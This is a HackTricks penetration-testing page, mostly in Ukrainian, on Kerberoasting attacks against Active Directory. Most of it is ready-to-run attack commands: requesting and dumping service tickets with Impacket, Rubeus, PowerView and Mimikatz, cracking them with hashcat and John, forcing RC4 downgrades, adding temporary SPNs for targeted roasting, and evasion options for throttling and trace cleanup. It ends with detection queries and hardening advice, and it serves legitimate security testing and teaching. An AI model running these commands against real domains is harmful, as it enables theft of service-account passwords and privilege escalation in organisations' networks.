# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting зосереджений на отриманні TGS-квитків, зокрема тих, що пов'язані зі службами, які працюють під обліковими записами користувачів в Active Directory (AD), за винятком комп'ютерних облікових записів. Ці квитки шифруються ключами, які походять від паролів користувачів, що дозволяє виконувати offline зломування облікових даних. Використання облікового запису користувача як сервісного облікового запису позначається непорожнім полем ServicePrincipalName (SPN).

Будь-який аутентифікований доменний користувач може запитувати TGS-квитки, тому спеціальні привілеї не потрібні.

### Key Points

- Націлено на TGS-квитки для сервісів, що працюють під обліковими записами користувачів (тобто облікові записи з встановленим SPN; не комп'ютерні облікові записи).
- Квитки шифруються ключем, виведеним з пароля сервісного облікового запису, і можуть бути зломувані offline.
- Підвищені привілеї не потрібні; будь-який аутентифікований обліковий запис може запитувати TGS-квитки.

> [!WARNING]
> Більшість публічних інструментів віддають перевагу запитам RC4-HMAC (etype 23) service tickets, оскільки їх швидше зламати, ніж AES. RC4 TGS-хеші починаються з `$krb5tgs$23$*`, AES128 — з `$krb5tgs$17$*`, а AES256 — з `$krb5tgs$18$*`. Проте багато середовищ переходять на AES-only. Не припускайте, що лише RC4 є релевантним.
> Також уникайте “spray-and-pray” roasting. Rubeus’ default kerberoast може опитувати й запитувати квитки для всіх SPN і це створює шум. Спочатку перелікуйте та націлюйтеся на цікаві principals.

### Service account secrets & Kerberos crypto cost

Багато сервісів досі працюють під користувацькими обліковими записами з паролями, що керуються вручну. KDC шифрує service tickets ключами, виведеними з цих паролів, і передає шифротекст будь-якому аутентифікованому principal, тому kerberoasting дає необмежену кількість offline спроб без блокувань чи DC телеметрії. Режим шифрування визначає бюджет для злому:

| Режим | Виведення ключа | Тип шифрування | Прибл. пропускна здатність на RTX 5090* | Примітки |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1 з 4,096 ітераціями та сіллю для кожного principal, згенерованою з домену + SPN | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | ~6.8 мільйонів спроб/с | Сіль ускладнює використання rainbow tables, але все ще дозволяє швидке зламування коротких паролів. |
| RC4 + NT hash | Один MD4 від пароля (несолений NT hash); Kerberos лише підмішує 8-байтовий confounder на квиток | etype 23 (`$krb5tgs$23$`) | ~4.18 **мільярда** спроб/с | ~1000× швидше за AES; нападники примушують використовувати RC4 коли `msDS-SupportedEncryptionTypes` це дозволяє. |

*Бенчмарки від Chick3nman, як наведено в [Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/).

Confounder RC4 лише рандомізує keystream; він не додає додаткової роботи на кожну спробу. Якщо сервісні облікові записи не покладаються на випадкові секрети (gMSA/dMSA, machine accounts, або vault-managed strings), швидкість компрометації залежить виключно від GPU-бюджету. Примусове застосування тільки AES etypes усуває пониження до мільярдів спроб за секунду, але слабкі людські паролі все ще піддаються PBKDF2.

### Атака

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Багатофункціональні інструменти, що включають перевірки kerberoast:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Перелічити kerberoastable користувачів
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Техніка 1: Запитати TGS і dump з пам'яті
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Техніка 2: Автоматизовані інструменти
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> Запит TGS генерує Windows Security Event 4769 (A Kerberos service ticket was requested).

### OPSEC і AES-only середовища

- Запитуйте RC4 навмисно для облікових записів без AES:
- Rubeus: `/rc4opsec` використовує tgtdeleg для перелічення облікових записів без AES і запитує RC4 service tickets.
- Rubeus: `/tgtdeleg` з kerberoast також викликає RC4-запити там, де це можливо.
- Roast AES-only accounts замість мовчазного пропускання:
- Rubeus: `/aes` перелічує облікові записи з увімкненим AES і запитує AES service tickets (etype 17/18).
- Якщо ви вже маєте TGT (PTT або з .kirbi), ви можете використовувати `/ticket:<blob|path>` з `/spn:<SPN>` або `/spns:<file>` і пропустити LDAP.
- Цілеспрямування, обмеження швидкості та зменшення шуму:
- Використовуйте `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` та `/jitter:<1-100>`.
- Фільтруйте за ймовірно слабкими паролями, використовуючи `/pwdsetbefore:<MM-dd-yyyy>` (старіші паролі) або націлюйтесь на привілейовані OU з `/ou:<DN>`.

Приклади (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Утримання доступу / Зловживання

Якщо ви контролюєте або можете змінити обліковий запис, ви можете зробити його kerberoastable, додавши SPN:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Понизити рівень облікового запису, щоб увімкнути RC4 для легшого cracking (потребує прав запису на цільовому об'єкті):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Цілеспрямований Kerberoast через GenericWrite/GenericAll над користувачем (тимчасовий SPN)

Коли BloodHound показує, що ви контролюєте об'єкт користувача (наприклад, GenericWrite/GenericAll), ви надійно можете «targeted-roast» цього конкретного користувача, навіть якщо він наразі не має жодних SPN:

- Додайте тимчасовий SPN до контрольованого користувача, щоб зробити його roastable.
- Запросіть TGS-REP, зашифрований RC4 (etype 23), для цього SPN, щоб полегшити cracking.
- Crack the `$krb5tgs$23$...` hash with hashcat.
- Очистіть SPN, щоб зменшити сліди.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Однорядкова команда для Linux (targetedKerberoast.py автоматизує add SPN -> request TGS (etype 23) -> remove SPN):
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
Розшифруйте вивід за допомогою hashcat autodetect (mode 13100 for `$krb5tgs$23$`):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
Detection notes: додавання/видалення SPNs спричиняє зміни в директорії (Event ID 5136/4738 для цільового користувача), а запит TGS генерує Event ID 4769. Розгляньте обмеження частоти та оперативне очищення.

You can find useful tools for kerberoast attacks here: https://github.com/nidem/kerberoast

If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` it’s due to local time skew. Sync to the DC:

- `ntpdate <DC_IP>` (deprecated on some distros)
- `rdate -n <DC_IP>`

### Kerberoast without a domain account (AS-requested STs)

У вересні 2022 року Charlie Clark показав, що якщо для principal не потрібна pre-authentication, можна отримати service ticket через створений KRB_AS_REQ, змінивши sname у тілі запиту, фактично отримавши service ticket замість TGT. Це відтворює AS-REP roasting і не потребує дійсних доменних облікових даних.

See details: Semperis write-up “New Attack Paths: AS-requested STs”.

> [!WARNING]
> Ви повинні надати список користувачів, оскільки без дійсних облікових даних ви не можете виконати запит до LDAP за допомогою цієї техніки.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Пов'язане

If you are targeting AS-REP roastable users, see also:

{{#ref}}
asreproast.md
{{#endref}}

### Виявлення

Kerberoasting може бути прихованим. Шукайте Event ID 4769 з DCs та застосовуйте фільтри для зменшення шуму:

- Виключайте ім'я служби `krbtgt` та імена служб, що закінчуються на `$` (облікові записи комп'ютерів).
- Виключайте запити від облікових записів машин (`*$$@*`).
- Тільки успішні запити (Failure Code `0x0`).
- Відстежуйте типи шифрування: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Не сповіщайте лише за `0x17`.

Приклад первинної перевірки PowerShell:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Additional ideas:

- Встановіть базовий рівень нормального використання SPN для кожного хоста/користувача; налаштуйте оповіщення про великі сплески різних запитів SPN від одного principal.
- Позначайте незвичне використання RC4 у доменах, захищених AES.

### Міри захисту / Зміцнення

- Use gMSA/dMSA or machine accounts for services. Managed accounts have 120+ character random passwords and rotate automatically, making offline cracking impractical.
- Примусово вимагайте AES для сервісних облікових записів, встановивши `msDS-SupportedEncryptionTypes` в AES-only (decimal 24 / hex 0x18), а потім виконайте ротацію пароля, щоб були отримані AES ключі.
- За можливості вимкніть RC4 у вашому середовищі та моніторте спроби використання RC4. На DCs можна використовувати значення реєстру `DefaultDomainSupportedEncTypes`, щоб керувати значеннями за замовчуванням для облікових записів, у яких не встановлено `msDS-SupportedEncryptionTypes`. Ретельно тестуйте.
- Видаліть непотрібні SPN з облікових записів користувачів.
- Використовуйте довгі випадкові паролі для сервісних облікових записів (25+ символів), якщо керовані облікові записи неможливі; забороняйте поширені паролі та регулярно здійснюйте аудит.

## References

- [https://github.com/ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [SpecterOps – Rubeus Roasting documentation](https://docs.specterops.io/ghostpack/rubeus/roasting)
- [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)

{{#include ../../banners/hacktricks-training.md}}
